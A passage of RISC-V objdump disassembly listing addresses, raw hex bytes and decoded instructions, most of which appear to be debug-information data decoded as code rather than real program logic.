     172:	0700                	addi	s0,sp,896
     174:	5432                	lw	s0,44(sp)
     176:	0000                	unimp
     178:	1000                	addi	s0,sp,32
     17a:	00056b0b          	0x56b0b
     17e:	0700                	addi	s0,sp,896
     180:	5432                	lw	s0,44(sp)
     182:	0000                	unimp
     184:	1400                	addi	s0,sp,544
     186:	5f0e                	lw	t5,224(sp)
     188:	0078                	addi	a4,sp,12
     18a:	01983307          	fld	ft6,25(a6)
     18e:	0000                	unimp
     190:	0018                	0x18
     192:	013f080f          	0x13f080f
     196:	0000                	unimp
     198:	3408                	fld	fa0,40(s0)
     19a:	0001                	nop
     19c:	a800                	fsd	fs0,16(s0)
     19e:	0001                	nop
     1a0:	0900                	addi	s0,sp,144
     1a2:	007f                	0x7f
     1a4:	0000                	unimp
     1a6:	0000                	unimp
     1a8:	f00d                	bnez	s0,ca <_tbss_end+0x46>
     1aa:	0001                	nop
     1ac:	2400                	fld	fs0,8(s0)
     1ae:	02213707          	fld	fa4,34(sp)
     1b2:	0000                	unimp
     1b4:	0000db0b          	0xdb0b
     1b8:	0700                	addi	s0,sp,896
     1ba:	5439                	li	s0,-18
     1bc:	0000                	unimp
     1be:	0000                	unimp
     1c0:	0004e50b          	0x4e50b
     1c4:	0700                	addi	s0,sp,896
     1c6:	543a                	lw	s0,172(sp)
     1c8:	0000                	unimp
     1ca:	0400                	addi	s0,sp,512
     1cc:	00010e0b          	0x10e0b
     1d0:	0700                	addi	s0,sp,896
     1d2:	0000543b          	srlw	s0,zero,zero
     1d6:	0800                	addi	s0,sp,16
     1d8:	0006010b          	0x6010b
     1dc:	0700                	addi	s0,sp,896
     1de:	543c                	lw	a5,104(s0)
     1e0:	0000                	unimp
     1e2:	0c00                	addi	s0,sp,528
     1e4:	00034d0b          	0x34d0b
     1e8:	0700                	addi	s0,sp,896
     1ea:	543d                	li	s0,-17
     1ec:	0000                	unimp
     1ee:	1000                	addi	s0,sp,32
     1f0:	0004db0b          	0x4db0b
     1f4:	0700                	addi	s0,sp,896
     1f6:	543e                	lw	s0,236(sp)
     1f8:	0000                	unimp
     1fa:	1400                	addi	s0,sp,544
     1fc:	0005700b          	0x5700b
     200:	0700                	addi	s0,sp,896
     202:	0000543f f20b1800 	0xf20b18000000543f
     20a:	07000003          	lb	zero,112(zero) # 70 <buf.2990+0x30>
     20e:	5440                	lw	s0,44(s0)
     210:	0000                	unimp
     212:	1c00                	addi	s0,sp,560
     214:	0005ab0b          	0x5ab0b
     218:	0700                	addi	s0,sp,896
     21a:	5441                	li	s0,-16
     21c:	0000                	unimp
     21e:	2000                	fld	fs0,0(s0)
     220:	1000                	addi	s0,sp,32
     222:	011d                	addi	sp,sp,7
     224:	0000                	unimp
     226:	0208                	addi	a0,sp,256
     228:	02624a07          	flq	fs4,38(tp) # 26 <_tdata_begin+0x26>
     22c:	0000                	unimp
     22e:	00019f0b          	0x19f0b
     232:	0700                	addi	s0,sp,896
     234:	0002624b          	fnmsub.s	ft4,ft4,ft0,ft0,unknown
     238:	0000                	unimp
     23a:	2011                	0x2011
     23c:	0002                	c.slli	zero,0x0
     23e:	0700                	addi	s0,sp,896
     240:	624c                	ld	a1,128(a2)
     242:	0002                	c.slli	zero,0x0
     244:	0000                	unimp
     246:	1101                	addi	sp,sp,-32
     248:	00000517          	auipc	a0,0x0
     24c:	01344e07          	flq	ft8,19(s0)
     250:	0000                	unimp
     252:	0200                	addi	s0,sp,256
     254:	4c11                	li	s8,4
     256:	0001                	nop
     258:	0700                	addi	s0,sp,896
     25a:	3451                	addiw	s0,s0,-12
     25c:	0001                	nop
     25e:	0400                	addi	s0,sp,512
     260:	0002                	c.slli	zero,0x0
     262:	3208                	fld	fa0,32(a2)
     264:	0001                	nop
     266:	7200                	ld	s0,32(a2)
     268:	0002                	c.slli	zero,0x0
     26a:	0900                	addi	s0,sp,144
     26c:	007f                	0x7f
     26e:	0000                	unimp
     270:	001f 5610 0003      	0x35610001f
     276:	1800                	addi	s0,sp,48
     278:	b15d0703          	lb	a4,-1259(s10) # 18b15 <_tbss_end+0x18a91>
     27c:	0002                	c.slli	zero,0x0
     27e:	0b00                	addi	s0,sp,400
     280:	0431                	addi	s0,s0,12
     282:	0000                	unimp
     284:	02b15e07          	0x2b15e07
     288:	0000                	unimp
     28a:	0b00                	addi	s0,sp,400
     28c:	0449                	addi	s0,s0,18
     28e:	0000                	unimp
     290:	00545f07          	0x545f07
     294:	0000                	unimp
     296:	0b08                	addi	a0,sp,400
     298:	000001a7          	0x1a7
     29c:	02b76107          	0x2b76107
     2a0:	0000                	unimp
     2a2:	1110                	addi	a2,sp,160
     2a4:	011d                	addi	sp,sp,7
     2a6:	0000                	unimp
     2a8:	02216207          	0x2216207
     2ac:	0000                	unimp
     2ae:	0110                	addi	a2,sp,128
     2b0:	0f00                	addi	s0,sp,912
     2b2:	7208                	ld	a0,32(a2)
     2b4:	0002                	c.slli	zero,0x0
     2b6:	0800                	addi	s0,sp,16
     2b8:	000002c7          	fmsub.s	ft5,ft0,ft0,ft0,rne
     2bc:	000002c7          	fmsub.s	ft5,ft0,ft0,ft0,rne
     2c0:	7f09                	lui	t5,0xfffe2
     2c2:	0000                	unimp
     2c4:	1f00                	addi	s0,sp,944
     2c6:	0f00                	addi	s0,sp,912
     2c8:	cd08                	sw	a0,24(a0)
     2ca:	0002                	c.slli	zero,0x0
     2cc:	1200                	addi	s0,sp,288
     2ce:	fc0d                	bnez	s0,208 <_tbss_end+0x184>
     2d0:	10000003          	lb	zero,256(zero) # 100 <_tbss_end+0x7c>
     2d4:	02f37507          	0x2f37507
     2d8:	0000                	unimp
     2da:	0001020b          	0x1020b
     2de:	0700                	addi	s0,sp,896
     2e0:	f376                	sd	t4,416(sp)
     2e2:	0002                	c.slli	zero,0x0
     2e4:	0000                	unimp
     2e6:	00069c0b          	0x69c0b
     2ea:	0700                	addi	s0,sp,896
     2ec:	00005477          	0x5477
     2f0:	0800                	addi	s0,sp,16
     2f2:	0f00                	addi	s0,sp,912
     2f4:	3f08                	fld	fa0,56(a4)
     2f6:	0000                	unimp
     2f8:	0d00                	addi	s0,sp,656
     2fa:	0000041b          	sext.w	s0,zero
     2fe:	07b0                	addi	a2,sp,968
     300:	23b5                	addiw	t2,t2,13
     302:	0004                	0x4
     304:	0e00                	addi	s0,sp,784
     306:	705f 0700 f3b6      	0xf3b60700705f
     30c:	0002                	c.slli	zero,0x0
     30e:	0000                	unimp
     310:	5f0e                	lw	t5,224(sp)
     312:	0072                	c.slli	zero,0x1c
     314:	0054b707          	fld	fa4,5(s1)
     318:	0000                	unimp
     31a:	0e08                	addi	a0,sp,784
     31c:	775f 0700 54b8      	0x54b80700775f
     322:	0000                	unimp
     324:	0c00                	addi	s0,sp,528
     326:	0001450b          	0x1450b
     32a:	0700                	addi	s0,sp,896
     32c:	46b9                	li	a3,14
     32e:	0000                	unimp
     330:	1000                	addi	s0,sp,32
     332:	0005650b          	0x5650b
     336:	0700                	addi	s0,sp,896
     338:	46ba                	lw	a3,140(sp)
     33a:	0000                	unimp
     33c:	1200                	addi	s0,sp,288
     33e:	5f0e                	lw	t5,224(sp)
     340:	6662                	ld	a2,24(sp)
     342:	0700                	addi	s0,sp,896
     344:	0002cebb          	0x2cebb
     348:	1800                	addi	s0,sp,48
     34a:	00008a0b          	0x8a0b
     34e:	0700                	addi	s0,sp,896
     350:	54bc                	lw	a5,104(s1)
     352:	0000                	unimp
     354:	2800                	fld	fs0,16(s0)
     356:	0001350b          	0x1350b
     35a:	0700                	addi	s0,sp,896
     35c:	000132c3          	fmadd.s	ft5,ft2,ft0,ft0,rup
     360:	3000                	fld	fs0,32(s0)
     362:	0001e00b          	0x1e00b
     366:	0700                	addi	s0,sp,896
     368:	90c5                	srli	s1,s1,0x31
     36a:	0005                	c.nop	1
     36c:	3800                	fld	fs0,48(s0)
     36e:	0002a10b          	0x2a10b
     372:	0700                	addi	s0,sp,896
     374:	0005bac7          	fmsub.s	fs5,fa1,ft0,ft0,rup
     378:	4000                	lw	s0,0(s0)
     37a:	00049e0b          	0x49e0b
     37e:	0700                	addi	s0,sp,896
     380:	deca                	sw	s2,124(sp)
     382:	0005                	c.nop	1
     384:	4800                	lw	s0,16(s0)
     386:	0005c50b          	0x5c50b
     38a:	0700                	addi	s0,sp,896
     38c:	0005f8cb          	fnmsub.s	fa7,fa1,ft0,ft0
     390:	5000                	lw	s0,32(s0)
     392:	5f0e                	lw	t5,224(sp)
     394:	6275                	lui	tp,0x1d
     396:	0700                	addi	s0,sp,896
     398:	cece                	sw	s3,92(sp)
     39a:	0002                	c.slli	zero,0x0
     39c:	5800                	lw	s0,48(s0)
     39e:	5f0e                	lw	t5,224(sp)
     3a0:	7075                	c.lui	zero,0xffffd
     3a2:	0700                	addi	s0,sp,896
     3a4:	0002f3cf          	fnmadd.s	ft7,ft5,ft0,ft0
     3a8:	6800                	ld	s0,16(s0)
     3aa:	5f0e                	lw	t5,224(sp)
     3ac:	7275                	lui	tp,0xffffd
     3ae:	0700                	addi	s0,sp,896
     3b0:	54d0                	lw	a2,44(s1)
     3b2:	0000                	unimp
     3b4:	7000                	ld	s0,32(s0)
     3b6:	0000fc0b          	0xfc0b
     3ba:	0700                	addi	s0,sp,896
     3bc:	0005fed3          	fadd.s	ft9,fa1,ft0
     3c0:	7400                	ld	s0,40(s0)
     3c2:	00059d0b          	0x59d0b
     3c6:	0700                	addi	s0,sp,896
     3c8:	0ed4                	addi	a3,sp,852
     3ca:	0006                	c.slli	zero,0x1
     3cc:	7700                	ld	s0,40(a4)
     3ce:	5f0e                	lw	t5,224(sp)
     3d0:	626c                	ld	a1,192(a2)
     3d2:	0700                	addi	s0,sp,896
     3d4:	0002ced7          	0x2ced7
     3d8:	7800                	ld	s0,48(s0)
     3da:	0001670b          	0x1670b
     3de:	0700                	addi	s0,sp,896
     3e0:	54da                	lw	s1,180(sp)
     3e2:	0000                	unimp
     3e4:	8800                	0x8800
     3e6:	0001780b          	0x1780b
     3ea:	0700                	addi	s0,sp,896
     3ec:	00009fdb          	0x9fdb
     3f0:	9000                	0x9000
     3f2:	00065f0b          	0x65f0b
     3f6:	0700                	addi	s0,sp,896
     3f8:	41de                	lw	gp,212(sp)
     3fa:	0004                	0x4
     3fc:	9800                	0x9800
     3fe:	0002880b          	0x2880b
     402:	0700                	addi	s0,sp,896
     404:	27e2                	fld	fa5,24(sp)
     406:	0001                	nop
     408:	a000                	fsd	fs0,0(s0)
     40a:	0004230b          	0x4230b
     40e:	0700                	addi	s0,sp,896
     410:	1ce4                	addi	s1,sp,636
     412:	0001                	nop
     414:	a400                	fsd	fs0,8(s0)
     416:	00028e0b          	0x28e0b
     41a:	0700                	addi	s0,sp,896
     41c:	54e5                	li	s1,-7
     41e:	0000                	unimp
     420:	ac00                	fsd	fs0,24(s0)
     422:	1300                	addi	s0,sp,416
     424:	00b5                	addi	ra,ra,13
     426:	0000                	unimp
     428:	0441                	addi	s0,s0,16
     42a:	0000                	unimp
     42c:	4114                	lw	a3,0(a0)
     42e:	0004                	0x4
     430:	1400                	addi	s0,sp,544
     432:	0132                	slli	sp,sp,0xc
     434:	0000                	unimp
     436:	7e14                	ld	a3,56(a2)
     438:	0005                	c.nop	1
     43a:	1400                	addi	s0,sp,544
     43c:	0054                	addi	a3,sp,4
     43e:	0000                	unimp
     440:	0f00                	addi	s0,sp,912
     442:	4c08                	lw	a0,24(s0)
     444:	0004                	0x4
     446:	1500                	addi	s0,sp,672
     448:	0441                	addi	s0,s0,16
     44a:	0000                	unimp
     44c:	8116                	mv	sp,t0
     44e:	0004                	0x4
     450:	4800                	lw	s0,16(s0)
     452:	02390707          	0x2390707
     456:	057e                	slli	a0,a0,0x1f
     458:	0000                	unimp
     45a:	0003e117          	auipc	sp,0x3e
     45e:	0700                	addi	s0,sp,896
     460:	0054023b          	addw	tp,s0,t0
     464:	0000                	unimp
     466:	1700                	addi	s0,sp,928
     468:	0154                	addi	a3,sp,132
     46a:	0000                	unimp
     46c:	65024007          	flq	ft0,1616(tp) # ffffffffffffd650 <_end+0xffffffff7ffe2190>
     470:	0006                	c.slli	zero,0x1
     472:	0800                	addi	s0,sp,16
     474:	00020817          	auipc	a6,0x20
     478:	0700                	addi	s0,sp,896
     47a:	0240                	addi	s0,sp,260
     47c:	0665                	addi	a2,a2,25
     47e:	0000                	unimp
     480:	1710                	addi	a2,sp,928
     482:	01c1                	addi	gp,gp,16
     484:	0000                	unimp
     486:	65024007          	flq	ft0,1616(tp) # 650 <_tbss_end+0x5cc>
     48a:	0006                	c.slli	zero,0x1
     48c:	1800                	addi	s0,sp,48
     48e:	00044417          	auipc	s0,0x44
     492:	0700                	addi	s0,sp,896
     494:	0242                	slli	tp,tp,0x10
     496:	0054                	addi	a3,sp,4
     498:	0000                	unimp
     49a:	1720                	addi	s0,sp,936
     49c:	002a                	c.slli	zero,0xa
     49e:	0000                	unimp
     4a0:	50024307          	flq	ft6,1280(tp) # 500 <_tbss_end+0x47c>
     4a4:	0008                	0x8
     4a6:	2400                	fld	fs0,8(s0)
     4a8:	00046017          	auipc	zero,0x46
     4ac:	0700                	addi	s0,sp,896
     4ae:	0246                	slli	tp,tp,0x11
     4b0:	0054                	addi	a3,sp,4
     4b2:	0000                	unimp
     4b4:	1740                	addi	s0,sp,932
     4b6:	044e                	slli	s0,s0,0x13
     4b8:	0000                	unimp
     4ba:	65024707          	flq	fa4,1616(tp) # 650 <_tbss_end+0x5cc>
     4be:	0008                	0x8
     4c0:	4800                	lw	s0,16(s0)
     4c2:	00036817          	auipc	a6,0x36
     4c6:	0700                	addi	s0,sp,896
     4c8:	0249                	addi	tp,tp,18
     4ca:	0054                	addi	a3,sp,4
     4cc:	0000                	unimp
     4ce:	1750                	addi	a2,sp,932
     4d0:	0456                	slli	s0,s0,0x15
     4d2:	0000                	unimp
     4d4:	76024b07          	flq	fs6,1888(tp) # 760 <_tbss_end+0x6dc>
     4d8:	0008                	0x8
     4da:	5800                	lw	s0,48(s0)
     4dc:	00027317          	auipc	t1,0x27
     4e0:	0700                	addi	s0,sp,896
     4e2:	024e                	slli	tp,tp,0x13
     4e4:	0192                	slli	gp,gp,0x4
     4e6:	0000                	unimp
     4e8:	1760                	addi	s0,sp,940
     4ea:	01e6                	slli	gp,gp,0x19
     4ec:	0000                	unimp
     4ee:	54024f07          	flq	ft10,1344(tp) # 540 <_tbss_end+0x4bc>
     4f2:	0000                	unimp
     4f4:	6800                	ld	s0,16(s0)
     4f6:	0005ed17          	auipc	s10,0x5e
     4fa:	0700                	addi	s0,sp,896
     4fc:	0250                	addi	a2,sp,260
     4fe:	0192                	slli	gp,gp,0x4
     500:	0000                	unimp
     502:	1770                	addi	a2,sp,940
     504:	039a                	slli	t2,t2,0x6
     506:	0000                	unimp
     508:	7c025107          	0x7c025107
     50c:	0008                	0x8
     50e:	7800                	ld	s0,48(s0)
     510:	00021017          	auipc	zero,0x21
     514:	0700                	addi	s0,sp,896
     516:	0254                	addi	a3,sp,260
     518:	0054                	addi	a3,sp,4
     51a:	0000                	unimp
     51c:	1780                	addi	s0,sp,992
     51e:	0170                	addi	a2,sp,140
     520:	0000                	unimp
     522:	7e025507          	0x7e025507
     526:	0005                	c.nop	1
     528:	8800                	0x8800
     52a:	0003da17          	auipc	s4,0x3d
     52e:	0700                	addi	s0,sp,896
     530:	0278                	addi	a4,sp,268
     532:	082d                	addi	a6,a6,11
     534:	0000                	unimp
     536:	1890                	addi	a2,sp,112
     538:	0356                	slli	t1,t1,0x15
     53a:	0000                	unimp
     53c:	b1027c07          	0xb1027c07
     540:	0002                	c.slli	zero,0x0
     542:	f800                	sd	s0,48(s0)
     544:	1801                	addi	a6,a6,-32
     546:	0246                	slli	tp,tp,0x11
     548:	0000                	unimp
     54a:	72027d07          	0x72027d07
     54e:	0002                	c.slli	zero,0x0
     550:	0000                	unimp
     552:	1802                	slli	a6,a6,0x20
     554:	00000593          	li	a1,0
     558:	8d028107          	0x8d028107
     55c:	0008                	0x8
     55e:	1800                	addi	s0,sp,48
     560:	1805                	addi	a6,a6,-31
     562:	013d                	addi	sp,sp,15
     564:	0000                	unimp
     566:	2a028607          	0x2a028607
     56a:	0006                	c.slli	zero,0x1
     56c:	2000                	fld	fs0,0(s0)
     56e:	1805                	addi	a6,a6,-31
     570:	0118                	addi	a4,sp,128
     572:	0000                	unimp
     574:	99028707          	0x99028707
     578:	0008                	0x8
     57a:	3800                	fld	fs0,48(s0)
     57c:	0005                	c.nop	1
     57e:	0584080f          	0x584080f
     582:	0000                	unimp
     584:	0102                	slli	sp,sp,0x0
     586:	cc08                	sw	a0,24(s0)
     588:	15000003          	lb	zero,336(zero) # 21660 <_tbss_end+0x215dc>
     58c:	0584                	addi	s1,sp,704
     58e:	0000                	unimp
     590:	0423080f          	0x423080f
     594:	0000                	unimp
     596:	0000b513          	sltiu	a0,ra,0
     59a:	b400                	fsd	fs0,40(s0)
     59c:	0005                	c.nop	1
     59e:	1400                	addi	s0,sp,544
     5a0:	0441                	addi	s0,s0,16
     5a2:	0000                	unimp
     5a4:	3214                	fld	fa3,32(a2)
     5a6:	0001                	nop
     5a8:	1400                	addi	s0,sp,544
     5aa:	05b4                	addi	a3,sp,712
     5ac:	0000                	unimp
     5ae:	5414                	lw	a3,40(s0)
     5b0:	0000                	unimp
     5b2:	0000                	unimp
     5b4:	058b080f          	0x58b080f
     5b8:	0000                	unimp
     5ba:	0596080f          	0x596080f
     5be:	0000                	unimp
     5c0:	0000aa13          	slti	s4,ra,0
     5c4:	de00                	sw	s0,56(a2)
     5c6:	0005                	c.nop	1
     5c8:	1400                	addi	s0,sp,544
     5ca:	0441                	addi	s0,s0,16
     5cc:	0000                	unimp
     5ce:	3214                	fld	fa3,32(a2)
     5d0:	0001                	nop
     5d2:	1400                	addi	s0,sp,544
     5d4:	00aa                	slli	ra,ra,0xa
     5d6:	0000                	unimp
     5d8:	5414                	lw	a3,40(s0)
     5da:	0000                	unimp
     5dc:	0000                	unimp
     5de:	05c0080f          	0x5c0080f
     5e2:	0000                	unimp
     5e4:	00005413          	srli	s0,zero,0x0
     5e8:	f800                	sd	s0,48(s0)
     5ea:	0005                	c.nop	1
     5ec:	1400                	addi	s0,sp,544
     5ee:	0441                	addi	s0,s0,16
     5f0:	0000                	unimp
     5f2:	3214                	fld	fa3,32(a2)
     5f4:	0001                	nop
     5f6:	0000                	unimp
     5f8:	05e4080f          	0x5e4080f
     5fc:	0000                	unimp
     5fe:	3f08                	fld	fa0,56(a4)
     600:	0000                	unimp
     602:	0e00                	addi	s0,sp,784
     604:	0006                	c.slli	zero,0x1
     606:	0900                	addi	s0,sp,144
     608:	007f                	0x7f
     60a:	0000                	unimp
     60c:	0002                	c.slli	zero,0x0
     60e:	3f08                	fld	fa0,56(a4)
     610:	0000                	unimp
     612:	1e00                	addi	s0,sp,816
     614:	0006                	c.slli	zero,0x1
     616:	0900                	addi	s0,sp,144
     618:	007f                	0x7f
     61a:	0000                	unimp
     61c:	0000                	unimp
     61e:	0905                	addi	s2,s2,1
     620:	0004                	0x4
     622:	0700                	addi	s0,sp,896
     624:	011f 02f9 0000      	0x2f9011f
     62a:	7a19                	lui	s4,0xfffe6
     62c:	0005                	c.nop	1
     62e:	1800                	addi	s0,sp,48
     630:	5f012307          	flw	ft6,1520(sp) # 3ea4a <_tbss_end+0x3e9c6>
     634:	0006                	c.slli	zero,0x1
     636:	1700                	addi	s0,sp,928
     638:	0431                	addi	s0,s0,12
     63a:	0000                	unimp
     63c:	5f012507          	flw	fa0,1520(sp)
     640:	0006                	c.slli	zero,0x1
     642:	0000                	unimp
     644:	00022c17          	auipc	s8,0x22
     648:	0700                	addi	s0,sp,896
     64a:	0126                	slli	sp,sp,0x9
     64c:	0054                	addi	a3,sp,4
     64e:	0000                	unimp
     650:	1708                	addi	a0,sp,928
     652:	00000403          	lb	s0,0(zero) # 0 <_tdata_begin>
     656:	65012707          	flw	fa4,1616(sp)
     65a:	0006                	c.slli	zero,0x1
     65c:	1000                	addi	s0,sp,32
     65e:	0f00                	addi	s0,sp,912
     660:	2a08                	fld	fa0,16(a2)
     662:	0006                	c.slli	zero,0x1
     664:	0f00                	addi	s0,sp,912
     666:	1e08                	addi	a0,sp,816
     668:	0006                	c.slli	zero,0x1
     66a:	1900                	addi	s0,sp,176
     66c:	0022                	c.slli	zero,0x8
     66e:	0000                	unimp
     670:	070e                	slli	a4,a4,0x3
     672:	06a0013f 88170000 	0x8817000006a0013f
     67a:	0004                	0x4
     67c:	0700                	addi	s0,sp,896
     67e:	0140                	addi	s0,sp,132
     680:	06a0                	addi	s0,sp,840
     682:	0000                	unimp
     684:	1700                	addi	s0,sp,928
     686:	04ff                	0x4ff
     688:	0000                	unimp
     68a:	a0014107          	flq	ft2,-1536(sp)
     68e:	0006                	c.slli	zero,0x1
     690:	0600                	addi	s0,sp,768
     692:	00052017          	auipc	zero,0x52
     696:	0700                	addi	s0,sp,896
     698:	0142                	slli	sp,sp,0x10
     69a:	004d                	c.nop	19
     69c:	0000                	unimp
     69e:	000c                	0xc
     6a0:	4d08                	lw	a0,24(a0)
     6a2:	0000                	unimp
     6a4:	b000                	fsd	fs0,32(s0)
     6a6:	0006                	c.slli	zero,0x1
     6a8:	0900                	addi	s0,sp,144
     6aa:	007f                	0x7f
     6ac:	0000                	unimp
     6ae:	0002                	c.slli	zero,0x0
     6b0:	d81a                	sw	t1,48(sp)
     6b2:	b1025907          	0xb1025907
     6b6:	17000007          	0x17000007
     6ba:	0558                	addi	a4,sp,644
     6bc:	0000                	unimp
     6be:	5b025b07          	0x5b025b07
     6c2:	0000                	unimp
     6c4:	0000                	unimp
     6c6:	00050517          	auipc	a0,0x50
     6ca:	0700                	addi	s0,sp,896
     6cc:	025c                	addi	a5,sp,260
     6ce:	057e                	slli	a0,a0,0x1f
     6d0:	0000                	unimp
     6d2:	1708                	addi	a0,sp,928
     6d4:	0266                	slli	tp,tp,0x19
     6d6:	0000                	unimp
     6d8:	b1025d07          	0xb1025d07
     6dc:	10000007          	0x10000007
     6e0:	0005b617          	auipc	a2,0x5b
     6e4:	0700                	addi	s0,sp,896
     6e6:	025e                	slli	tp,tp,0x17
     6e8:	01a8                	addi	a0,sp,200
     6ea:	0000                	unimp
     6ec:	172c                	addi	a1,sp,936
     6ee:	01d1                	addi	gp,gp,20
     6f0:	0000                	unimp
     6f2:	54025f07          	0x54025f07
     6f6:	0000                	unimp
     6f8:	5000                	lw	s0,32(s0)
     6fa:	00042c17          	auipc	s8,0x42
     6fe:	0700                	addi	s0,sp,896
     700:	0260                	addi	s0,sp,268
     702:	07c1                	addi	a5,a5,16
     704:	0000                	unimp
     706:	1758                	addi	a4,sp,932
     708:	05cc                	addi	a1,sp,708
     70a:	0000                	unimp
     70c:	6b026107          	0x6b026107
     710:	0006                	c.slli	zero,0x1
     712:	6000                	ld	s0,0(s0)
     714:	00043717          	auipc	a4,0x43
     718:	0700                	addi	s0,sp,896
     71a:	0262                	slli	tp,tp,0x18
     71c:	011c                	addi	a5,sp,128
     71e:	0000                	unimp
     720:	1770                	addi	a2,sp,940
     722:	000005d7          	0x5d7
     726:	1c026307          	0x1c026307
     72a:	0001                	nop
     72c:	7800                	ld	s0,48(s0)
     72e:	0000cd17          	auipc	s10,0xc
     732:	0700                	addi	s0,sp,896
     734:	0264                	addi	s1,sp,268
     736:	011c                	addi	a5,sp,128
     738:	0000                	unimp
     73a:	1780                	addi	s0,sp,992
     73c:	0589                	addi	a1,a1,2
     73e:	0000                	unimp
     740:	c8026507          	0xc8026507
     744:	88000007          	0x88000007
     748:	00025a17          	auipc	s4,0x25
     74c:	0700                	addi	s0,sp,896
     74e:	0266                	slli	tp,tp,0x19
     750:	07d8                	addi	a4,sp,964
     752:	0000                	unimp
     754:	1790                	addi	a2,sp,992
     756:	052d                	addi	a0,a0,11
     758:	0000                	unimp
     75a:	54026707          	0x54026707
     75e:	0000                	unimp
     760:	a800                	fsd	fs0,16(s0)
     762:	00019117          	auipc	sp,0x19
     766:	0700                	addi	s0,sp,896
     768:	0268                	addi	a0,sp,268
     76a:	011c                	addi	a5,sp,128
     76c:	0000                	unimp
     76e:	17ac                	addi	a1,sp,1000
     770:	00b6                	slli	ra,ra,0xd
     772:	0000                	unimp
     774:	1c026907          	0x1c026907
     778:	0001                	nop
     77a:	b400                	fsd	fs0,40(s0)
     77c:	00018017          	auipc	zero,0x18
     780:	0700                	addi	s0,sp,896
     782:	026a                	slli	tp,tp,0x1a
     784:	011c                	addi	a5,sp,128
     786:	0000                	unimp
     788:	17bc                	addi	a5,sp,1000
     78a:	00000053          	fadd.s	ft0,ft0,ft0,rne
     78e:	1c026b07          	0x1c026b07
     792:	0001                	nop
     794:	c400                	sw	s0,8(s0)
     796:	00006217          	auipc	tp,0x6
     79a:	0700                	addi	s0,sp,896
     79c:	026c                	addi	a1,sp,268
     79e:	011c                	addi	a5,sp,128
     7a0:	0000                	unimp
     7a2:	17cc                	addi	a1,sp,996
     7a4:	03df 0000 6d07      	0x6d07000003df
     7aa:	5402                	lw	s0,32(sp)
     7ac:	0000                	unimp
     7ae:	d400                	sw	s0,40(s0)
     7b0:	0800                	addi	s0,sp,16
     7b2:	0584                	addi	s1,sp,704
     7b4:	0000                	unimp
     7b6:	07c1                	addi	a5,a5,16
     7b8:	0000                	unimp
     7ba:	7f09                	lui	t5,0xfffe2
     7bc:	0000                	unimp
     7be:	1900                	addi	s0,sp,176
     7c0:	0200                	addi	s0,sp,256
     7c2:	0708                	addi	a0,sp,896
     7c4:	00000073          	ecall
     7c8:	8408                	0x8408
     7ca:	0005                	c.nop	1
     7cc:	d800                	sw	s0,48(s0)
     7ce:	09000007          	0x9000007
     7d2:	007f                	0x7f
     7d4:	0000                	unimp
     7d6:	84080007          	0x84080007
     7da:	0005                	c.nop	1
     7dc:	e800                	sd	s0,16(s0)
     7de:	09000007          	0x9000007
     7e2:	007f                	0x7f
     7e4:	0000                	unimp
     7e6:	681b0017          	auipc	zero,0x681b0
     7ea:	0701                	addi	a4,a4,0
     7ec:	0272                	slli	tp,tp,0x1c
     7ee:	080d                	addi	a6,a6,3
     7f0:	0000                	unimp
     7f2:	00033917          	auipc	s2,0x33
     7f6:	0700                	addi	s0,sp,896
     7f8:	0275                	addi	tp,tp,29
     7fa:	080d                	addi	a6,a6,3
     7fc:	0000                	unimp
     7fe:	1700                	addi	s0,sp,928
     800:	031a                	slli	t1,t1,0x6
     802:	0000                	unimp
     804:	1d027607          	0x1d027607
     808:	0008                	0x8
     80a:	f000                	sd	s0,32(s0)
     80c:	0800                	addi	s0,sp,16
     80e:	000002f3          	0x2f3
     812:	081d                	addi	a6,a6,7
     814:	0000                	unimp
     816:	7f09                	lui	t5,0xfffe2
     818:	0000                	unimp
     81a:	1d00                	addi	s0,sp,688
     81c:	0800                	addi	s0,sp,16
     81e:	0000005b          	0x5b
     822:	082d                	addi	a6,a6,11
     824:	0000                	unimp
     826:	7f09                	lui	t5,0xfffe2
     828:	0000                	unimp
     82a:	1d00                	addi	s0,sp,688
     82c:	1c00                	addi	s0,sp,560
     82e:	0168                	addi	a0,sp,140
     830:	50025707          	0x50025707
     834:	0008                	0x8
     836:	1d00                	addi	s0,sp,688
     838:	0481                	addi	s1,s1,0
     83a:	0000                	unimp
     83c:	b0026e07          	0xb0026e07
     840:	0006                	c.slli	zero,0x1
     842:	1d00                	addi	s0,sp,688
     844:	000005a3          	sb	zero,11(zero) # 681b07f1 <_tbss_end+0x681b076d>
     848:	e8027707          	0xe8027707
     84c:	00000007          	0x7
     850:	8408                	0x8408
     852:	0005                	c.nop	1
     854:	6000                	ld	s0,0(s0)
     856:	0008                	0x8
     858:	0900                	addi	s0,sp,144
     85a:	007f                	0x7f
     85c:	0000                	unimp
     85e:	0018                	0x18
     860:	a21e                	fsd	ft7,256(sp)
     862:	0000                	unimp
     864:	0f00                	addi	s0,sp,912
     866:	6008                	ld	a0,0(s0)
     868:	0008                	0x8
     86a:	1f00                	addi	s0,sp,944
     86c:	0876                	slli	a6,a6,0x1d
     86e:	0000                	unimp
     870:	4114                	lw	a3,0(a0)
     872:	0004                	0x4
     874:	0000                	unimp
     876:	086b080f          	0x86b080f
     87a:	0000                	unimp
     87c:	0192080f          	0x192080f
     880:	0000                	unimp
     882:	8d1f 0008 1400      	0x140000088d1f
     888:	0054                	addi	a3,sp,4
     88a:	0000                	unimp
     88c:	0f00                	addi	s0,sp,912
     88e:	9308                	0x9308
     890:	0008                	0x8
     892:	0f00                	addi	s0,sp,912
     894:	8208                	0x8208
     896:	0008                	0x8
     898:	0800                	addi	s0,sp,16
     89a:	061e                	slli	a2,a2,0x7
     89c:	0000                	unimp
     89e:	08a9                	addi	a7,a7,10
     8a0:	0000                	unimp
     8a2:	7f09                	lui	t5,0xfffe2
     8a4:	0000                	unimp
     8a6:	0200                	addi	s0,sp,256
     8a8:	2000                	fld	fs0,0(s0)
     8aa:	0541                	addi	a0,a0,16
     8ac:	0000                	unimp
     8ae:	4102fe07          	0x4102fe07
     8b2:	0004                	0x4
     8b4:	2000                	fld	fs0,0(s0)
     8b6:	053a                	slli	a0,a0,0xe
     8b8:	0000                	unimp
     8ba:	4702ff07          	0x4702ff07
     8be:	0004                	0x4
     8c0:	0300                	addi	s0,sp,384
     8c2:	00000037          	lui	zero,0x0
     8c6:	1808                	addi	a0,sp,48
     8c8:	0034                	addi	a3,sp,8
     8ca:	0000                	unimp
     8cc:	00009a03          	lh	s4,0(ra)
     8d0:	0800                	addi	s0,sp,16
     8d2:	6238                	ld	a4,64(a2)
     8d4:	0000                	unimp
     8d6:	0300                	addi	s0,sp,384
     8d8:	038a                	slli	t2,t2,0x2
